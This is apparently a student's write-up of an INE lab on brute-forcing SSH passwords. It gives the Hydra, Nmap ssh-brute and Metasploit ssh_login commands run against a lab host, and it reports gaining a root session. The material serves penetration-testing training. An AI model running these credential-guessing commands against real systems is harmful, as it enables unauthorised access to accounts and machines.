---
description: >-
  In this lab, you will learn to run a dictionary attack on SSH service using
  Hydra, Nmap script, and Metasploit.
---

# Lab - Bruteforce and Password cracking Live

## Lab Environment

In this lab environment, the user is going to get access to a Kali GUI instance. An SSH server can be accessed using the tools installed on Kali on http://demo.ine.local

**Objective:** Perform the following activities:

**1.** Find the password of user "student" using Hydra. Use password dictionary: /usr/share/wordlists/rockyou.txt.gz

**2.** Find the password of user "administrator" use appropriate Nmap script. Use password dictionary: /usr/share/nmap/nselib/data/passwords.lst

**3.** Find the password of user "root" using the ssh\_login Metasploit module. Use userpass dictionary: /usr/share/wordlists/metasploit/root\_userpass.txt

## Tools

The best tools for this lab are:

* Metasploit Framework
* Hydra
* Nmap

## My Solution

### Hydra

The rockyou.txt is originally compressed via gzip so you have to first decompress it with:

```
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

The command I ran to find the password for student was:

```
hydra -l student -P /usr/share/wordlists/rockyou.txt demo.ine.local ssh -f
```

![](<../../../../.gitbook/assets/image (29) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Here's confirmation that it works

![](<../../../../.gitbook/assets/image (24) (1) (1) (1) (1) (1) (1) (1) (1).png>)

[This](https://linuxconfig.org/ssh-password-testing-with-hydra-on-kali-linux) can help with using Hydra for ssh

### Nmap

We use the ssh-brute Nmap [script](https://nmap.org/nsedoc/scripts/ssh-brute.html) to find the password for user "administrator"

The script takes username and password list files so we have to create a file for the username

I ran the following to do this: `echo "administrator" > users.lst`

Here's the nmap command:

```
nmap -p22 --script=ssh-brute --script-args userdb=users.lst,passdb=/usr/share/nmap/nselib/data/passwords.lst demo.ine.local
```

Now we verify the credentials

![](<../../../../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1).png>)

### Metasploit

This [article](https://www.offensive-security.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/) by Offensive Security is very straight forward and easy to follow

Launch Metasploit using `msfconsole`

Then type: `use auxiliary/scanner/ssh/ssh_login`

View options with "show options" and set the ones we need as such:

![](<../../../../.gitbook/assets/image (19) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Now type run and enter

![](<../../../../.gitbook/assets/image (18) (1) (1) (1) (1) (1) (1) (1) (1).png>)

As you can see, the password for root is attack and we're given a session that we can interact with using `sessions -i <id number>` and verify that we are indeed root
